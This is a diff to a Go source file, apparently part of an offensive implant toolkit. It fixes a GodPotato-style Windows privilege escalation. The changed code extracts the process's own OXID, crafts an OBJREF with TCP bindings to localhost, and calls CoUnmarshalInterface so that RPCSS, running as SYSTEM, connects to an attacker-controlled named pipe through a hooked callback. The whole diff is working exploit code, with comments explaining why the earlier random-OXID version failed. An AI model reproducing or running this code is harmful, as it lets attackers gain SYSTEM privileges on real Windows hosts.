@@ -4,6 +4,7 @@
 package commands
 
 import (
+	"encoding/base64"
 	"encoding/binary"
 	"fmt"
 	"strings"
@@ -113,10 +114,13 @@ var potatoGlobal potatoState
 
 // Windows API procs for COM and memory operations
 var (
-	ole32DLL            = windows.NewLazySystemDLL("ole32.dll")
-	procCoInitializeEx  = ole32DLL.NewProc("CoInitializeEx")
-	procCoUninitialize  = ole32DLL.NewProc("CoUninitialize")
-	procCoUnmarshalIntf = ole32DLL.NewProc("CoUnmarshalInterface")
+	ole32DLL               = windows.NewLazySystemDLL("ole32.dll")
+	procCoInitializeEx     = ole32DLL.NewProc("CoInitializeEx")
+	procCoUninitialize     = ole32DLL.NewProc("CoUninitialize")
+	procCoUnmarshalIntf    = ole32DLL.NewProc("CoUnmarshalInterface")
+	procCreateObjrefMonik  = ole32DLL.NewProc("CreateObjrefMoniker")
+	procCreateBindCtx      = ole32DLL.NewProc("CreateBindCtx")
+	procCoTaskMemFree      = ole32DLL.NewProc("CoTaskMemFree")
 
 	procVirtualQuery = kernel32NP.NewProc("VirtualQuery")
 	// procGetModuleHandleW is declared in spawn.go
@@ -488,56 +492,199 @@ func makeUseProtSeqHook(pipeShortName string) func(a1, a2, a3, a4, a5, a6 uintpt
 	}
 }
 
-// triggerOXIDResolution constructs an OBJREF and calls CoUnmarshalInterface
-// to trigger OXID resolution through our hooked UseProtSeq.
-func triggerOXIDResolution() error {
-	// Build OBJREF manually
-	// Structure: Signature(4) + Flags(4) + IID(16) + STDOBJREF + DUALSTRINGARRAY
-	objref := buildOBJREF()
+// extractProcessOXID creates a COM object, marshals it via CreateObjrefMoniker,
+// and parses the resulting OBJREF to extract our process's OXID, OID, and IPID.
+// GodPotato requires the process's own OXID — a random OXID won't trigger
+// the UseProtSeq callback because RPCSS won't find it in its OXID table.
+func extractProcessOXID() (oxid [8]byte, oid [8]byte, ipid [16]byte, err error) {
+	// Create a minimal IUnknown COM object
+	iunknown := createMinimalIUnknown()
+	if iunknown == 0 {
+		err = fmt.Errorf("failed to create IUnknown object")
+		return
+	}
 
-	// Create a minimal IStream wrapping our OBJREF bytes
+	// CreateObjrefMoniker(pUnknown, &pMoniker) → marshals the object
+	var pMoniker uintptr
+	ret, _, callErr := procCreateObjrefMonik.Call(iunknown, uintptr(unsafe.Pointer(&pMoniker)))
+	if ret != 0 || pMoniker == 0 {
+		err = fmt.Errorf("CreateObjrefMoniker: hr=0x%x %v", ret, callErr)
+		return
+	}
+	defer comRelease(pMoniker)
+
+	// CreateBindCtx(0, &pBindCtx)
+	var pBindCtx uintptr
+	ret, _, callErr = procCreateBindCtx.Call(0, uintptr(unsafe.Pointer(&pBindCtx)))
+	if ret != 0 || pBindCtx == 0 {
+		err = fmt.Errorf("CreateBindCtx: hr=0x%x %v", ret, callErr)
+		return
+	}
+	defer comRelease(pBindCtx)
+
+	// IMoniker::GetDisplayName(pBindCtx, NULL, &displayName)
+	// GetDisplayName is at vtable index 20
+	var pDisplayName uintptr
+	monikerVtbl := *(*uintptr)(unsafe.Pointer(pMoniker))
+	getDisplayNameFunc := *(*uintptr)(unsafe.Pointer(monikerVtbl + 20*unsafe.Sizeof(uintptr(0))))
+	ret, _, callErr = syscall.SyscallN(getDisplayNameFunc, pMoniker, pBindCtx, 0, uintptr(unsafe.Pointer(&pDisplayName)))
+	if ret != 0 || pDisplayName == 0 {
+		err = fmt.Errorf("GetDisplayName: hr=0x%x %v", ret, callErr)
+		return
+	}
+	defer procCoTaskMemFree.Call(pDisplayName)
+
+	// Parse the display name: "objref:MEOW<base64>:"
+	displayStr := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(pDisplayName)))
+
+	// Strip "objref:" prefix and ":" suffix
+	displayStr = strings.TrimPrefix(displayStr, "objref:")
+	displayStr = strings.TrimSuffix(displayStr, ":")
+
+	// Base64 decode to get raw OBJREF bytes
+	objrefBytes, decErr := base64.StdEncoding.DecodeString(displayStr)
+	if decErr != nil {
+		// Try with padding
+		for len(displayStr)%4 != 0 {
+			displayStr += "="
+		}
+		objrefBytes, decErr = base64.StdEncoding.DecodeString(displayStr)
+	}
+	if decErr != nil {
+		err = fmt.Errorf("decode OBJREF: %v (display=%s)", decErr, displayStr[:potatoMin(40, len(displayStr))])
+		return
+	}
+
+	// Parse OBJREF structure to extract OXID, OID, IPID
+	// OBJREF layout:
+	//   offset 0:  Signature (4 bytes) = "MEOW"
+	//   offset 4:  Flags (4 bytes) = OBJREF_STANDARD
+	//   offset 8:  IID (16 bytes)
+	//   offset 24: STDOBJREF.flags (4 bytes)
+	//   offset 28: STDOBJREF.cPublicRefs (4 bytes)
+	//   offset 32: STDOBJREF.oxid (8 bytes)
+	//   offset 40: STDOBJREF.oid (8 bytes)
+	//   offset 48: STDOBJREF.ipid (16 bytes)
+	if len(objrefBytes) < 64 {
+		err = fmt.Errorf("OBJREF too short: %d bytes", len(objrefBytes))
+		return
+	}
+
+	copy(oxid[:], objrefBytes[32:40])
+	copy(oid[:], objrefBytes[40:48])
+	copy(ipid[:], objrefBytes[48:64])
+	return
+}
+
+func potatoMin(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
+
+// createMinimalIUnknown creates a COM IUnknown object in Go that can be
+// passed to CreateObjrefMoniker. The standard COM marshaler will use it
+// to register an OXID with RPCSS.
+func createMinimalIUnknown() uintptr {
+	// Ensure callbacks stay alive (prevent GC)
+	potatoGlobal.mu.Lock()
+	defer potatoGlobal.mu.Unlock()
+
+	// Build vtable with 3 IUnknown methods
+	type iunknownVtbl struct {
+		QueryInterface uintptr
+		AddRef         uintptr
+		Release        uintptr
+	}
+
+	vtbl := &iunknownVtbl{
+		QueryInterface: syscall.NewCallback(func(this, riid, ppv uintptr) uintptr {
+			if ppv == 0 {
+				return 0x80004003 // E_POINTER
+			}
+			// Return our own pointer for any QI
+			*(*uintptr)(unsafe.Pointer(ppv)) = this
+			return 0 // S_OK
+		}),
+		AddRef: syscall.NewCallback(func(this uintptr) uintptr {
+			return 1
+		}),
+		Release: syscall.NewCallback(func(this uintptr) uintptr {
+			return 0
+		}),
+	}
+
+	// The COM object is just a pointer to its vtable pointer
+	obj := &struct{ vtbl *iunknownVtbl }{vtbl: vtbl}
+	return uintptr(unsafe.Pointer(obj))
+}
+
+// comRelease calls IUnknown::Release on a COM interface pointer.
+func comRelease(punk uintptr) {
+	if punk == 0 {
+		return
+	}
+	vtblPtr := *(*uintptr)(unsafe.Pointer(punk))
+	releaseFunc := *(*uintptr)(unsafe.Pointer(vtblPtr + 2*unsafe.Sizeof(uintptr(0))))
+	syscall.SyscallN(releaseFunc, punk)
+}
+
+// triggerOXIDResolution extracts the process's own OXID, constructs a crafted
+// OBJREF with TCP bindings, and calls CoUnmarshalInterface to trigger OXID
+// resolution through the hooked UseProtSeq callback.
+func triggerOXIDResolution() error {
+	// Step 1: Get our own OXID, OID, IPID via CreateObjrefMoniker
+	oxid, oid, ipid, err := extractProcessOXID()
+	if err != nil {
+		return fmt.Errorf("extract OXID: %w", err)
+	}
+
+	// Step 2: Build crafted OBJREF with our OXID but TCP bindings to 127.0.0.1
+	objref := buildCraftedOBJREF(oxid, oid, ipid)
+
+	// Step 3: Create IStream wrapping our OBJREF
 	stream, streamRelease, err := createOBJREFStream(objref)
 	if err != nil {
 		return fmt.Errorf("create IStream: %w", err)
 	}
 	defer streamRelease()
 
-	// Call CoUnmarshalInterface
+	// Step 4: Call CoUnmarshalInterface to trigger OXID resolution
+	// This causes COM to contact RPCSS to resolve the OXID.
+	// Since the DUALSTRINGARRAY specifies TCP (which we haven't registered),
+	// RPCSS calls the ORCB UseProtSeq callback (which we hooked) to ask us
+	// to register TCP. Our hook returns a pipe binding, and RPCSS (SYSTEM)
+	// connects to our named pipe.
 	var punk uintptr
-	ret, _, callErr := procCoUnmarshalIntf.Call(
+	ret, _, _ := procCoUnmarshalIntf.Call(
 		stream,
 		uintptr(unsafe.Pointer(&iidIUnknown)),
 		uintptr(unsafe.Pointer(&punk)),
 	)
 
-	// CoUnmarshalInterface may return an error (the fake object doesn't really exist),
-	// but the important thing is that it triggered OXID resolution which hit our hook.
-	if ret != 0 && punk == 0 {
-		// This is expected — the unmarshaling triggers OXID resolution
-		// even if the final interface creation fails
-		return nil
-	}
-
 	if punk != 0 {
-		// Release the interface if we somehow got one
-		releaseVtbl := *(*uintptr)(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(punk)) + 2*unsafe.Sizeof(uintptr(0))))
-		syscall.SyscallN(releaseVtbl, punk)
+		comRelease(punk)
 	}
 
-	_ = callErr
+	// CoUnmarshalInterface will likely return an error (the object's bindings
+	// are fake), but the side effect of triggering OXID resolution is what we want.
+	_ = ret
 	return nil
 }
 
-// buildOBJREF constructs a standard OBJREF structure.
-func buildOBJREF() []byte {
+// buildCraftedOBJREF constructs a standard OBJREF with the process's own
+// OXID/OID/IPID but with TCP bindings to 127.0.0.1. This forces RPCSS
+// to call UseProtSeq because the process hasn't registered TCP yet.
+func buildCraftedOBJREF(oxid [8]byte, oid [8]byte, ipid [16]byte) []byte {
 	buf := make([]byte, 0, 256)
 
-	// Signature
+	// Signature ("MEOW")
 	sig := make([]byte, 4)
 	binary.LittleEndian.PutUint32(sig, objrefSignature)
 	buf = append(buf, sig...)
 
-	// Flags (Standard)
+	// Flags (OBJREF_STANDARD)
 	flags := make([]byte, 4)
 	binary.LittleEndian.PutUint32(flags, objrefStandard)
 	buf = append(buf, flags...)
@@ -545,43 +692,36 @@ func buildOBJREF() []byte {
 	// IID (IID_IUnknown)
 	buf = append(buf, iidIUnknown[:]...)
 
-	// STDOBJREF
-	// Flags (4 bytes)
+	// STDOBJREF.flags (4 bytes)
 	stdobjFlags := make([]byte, 4)
 	binary.LittleEndian.PutUint32(stdobjFlags, 0)
 	buf = append(buf, stdobjFlags...)
 
-	// PublicRefs (4 bytes)
+	// STDOBJREF.cPublicRefs (4 bytes)
 	pubRefs := make([]byte, 4)
 	binary.LittleEndian.PutUint32(pubRefs, 1)
 	buf = append(buf, pubRefs...)
 
-	// OXID (8 bytes) — use a random value
-	oxid := make([]byte, 8)
-	binary.LittleEndian.PutUint64(oxid, uint64(time.Now().UnixNano()))
-	buf = append(buf, oxid...)
+	// STDOBJREF.oxid (8 bytes) — OUR process's OXID
+	buf = append(buf, oxid[:]...)
 
-	// OID (8 bytes)
-	oid := make([]byte, 8)
-	binary.LittleEndian.PutUint64(oid, uint64(time.Now().UnixNano()+1))
-	buf = append(buf, oid...)
+	// STDOBJREF.oid (8 bytes) — OUR object's OID
+	buf = append(buf, oid[:]...)
 
-	// IPID (16 bytes) — fake GUID
-	ipid := [16]byte{0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
-		0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10}
+	// STDOBJREF.ipid (16 bytes) — OUR interface IPID
 	buf = append(buf, ipid[:]...)
 
-	// DUALSTRINGARRAY — point to localhost via TCP (triggers OXID resolution)
-	dsArray := buildResolverDualStringArray()
+	// DUALSTRINGARRAY — TCP to 127.0.0.1 (forces UseProtSeq callback)
+	dsArray := buildTCPDualStringArray()
 	buf = append(buf, dsArray...)
 
 	return buf
 }
 
-// buildResolverDualStringArray creates a DUALSTRINGARRAY pointing to 127.0.0.1
-// via TCP, which forces the COM runtime to do OXID resolution.
-func buildResolverDualStringArray() []byte {
-	// String binding: ncacn_ip_tcp (tower 0x07) + "127.0.0.1"
+// buildTCPDualStringArray creates a DUALSTRINGARRAY pointing to 127.0.0.1
+// via TCP (tower 0x07). Since our process only registered ALPC (local),
+// the TCP binding forces RPCSS to call UseProtSeq to ask us to register TCP.
+func buildTCPDualStringArray() []byte {
 	towerID := uint16(0x0007) // ncacn_ip_tcp
 	addr := utf16Encode("127.0.0.1")
 
@@ -614,48 +754,12 @@ func buildResolverDualStringArray() []byte {
 	return result
 }
 
-// COM IStream vtable for wrapping OBJREF bytes.
-// Minimal implementation — only Read needs real logic.
-
-type iStreamImpl struct {
-	vtbl    *iStreamVtbl
-	refCount int32
-	data    []byte
-	pos     int
-}
-
-type iStreamVtbl struct {
-	QueryInterface uintptr
-	AddRef         uintptr
-	Release        uintptr
-	Read           uintptr
-	Write          uintptr
-	Seek           uintptr
-	SetSize        uintptr
-	CopyTo         uintptr
-	Commit         uintptr
-	Revert         uintptr
-	LockRegion     uintptr
-	UnlockRegion   uintptr
-	Stat           uintptr
-	Clone          uintptr
-}
-
-var (
-	streamInstance *iStreamImpl
-	streamVtblMu  sync.Mutex
-)
-
 func createOBJREFStream(objrefData []byte) (uintptr, func(), error) {
-	streamVtblMu.Lock()
-	defer streamVtblMu.Unlock()
-
-	// Use SHCreateMemStream from shlwapi.dll as simpler alternative
+	// Use SHCreateMemStream from shlwapi.dll
 	shlwapiDLL := windows.NewLazySystemDLL("shlwapi.dll")
 	procSHCreateMemStream := shlwapiDLL.NewProc("SHCreateMemStream")
 
 	if procSHCreateMemStream.Find() == nil {
-		// Use SHCreateMemStream — much simpler than manual vtable
 		stream, _, err := procSHCreateMemStream.Call(
 			uintptr(unsafe.Pointer(&objrefData[0])),
 			uintptr(len(objrefData)),
@@ -665,10 +769,7 @@ func createOBJREFStream(objrefData []byte) (uintptr, func(), error) {
 		}
 
 		release := func() {
-			// Call IUnknown::Release (vtable index 2)
-			vtblPtr := *(*uintptr)(unsafe.Pointer(stream))
-			releaseFunc := *(*uintptr)(unsafe.Pointer(vtblPtr + 2*unsafe.Sizeof(uintptr(0))))
-			syscall.SyscallN(releaseFunc, stream)
+			comRelease(stream)
 		}
 
 		return stream, release, nil
